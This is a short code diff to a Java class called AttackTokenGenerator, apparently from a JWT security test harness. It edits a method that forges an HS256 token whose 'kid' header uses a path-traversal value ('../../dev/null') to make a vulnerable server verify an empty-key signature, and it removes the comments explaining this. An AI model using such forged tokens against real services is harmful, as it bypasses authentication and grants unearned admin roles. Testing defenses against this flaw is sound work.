@@ -106,9 +106,7 @@ public class AttackTokenGenerator {
      */
     public static String createKidPathTraversalToken(String user, String role) {
         try {
-            // Header with path traversal in kid. In unsecured server, it reads empty file and verifies empty HMAC.
-            // In secured server, it tries RS256 with malicious kid, which fails kid regex validation!
-            String header = "{\"alg\":\"HS256\",\"typ\":\"at+jwt\",\"kid\":\"../../../../../../dev/null\"}";
+            String header = "{\"alg\":\"HS256\",\"typ\":\"at+jwt\",\"kid\":\"../../../../../../../../../../dev/null\"}";
             String payload = String.format(
                 "{\"sub\":\"%s\",\"role\":\"%s\",\"iss\":\"%s\",\"aud\":\"secured-admin-api\",\"iat\":%d}",
                 user, role, KeyManager.ISSUER, Instant.now().getEpochSecond()
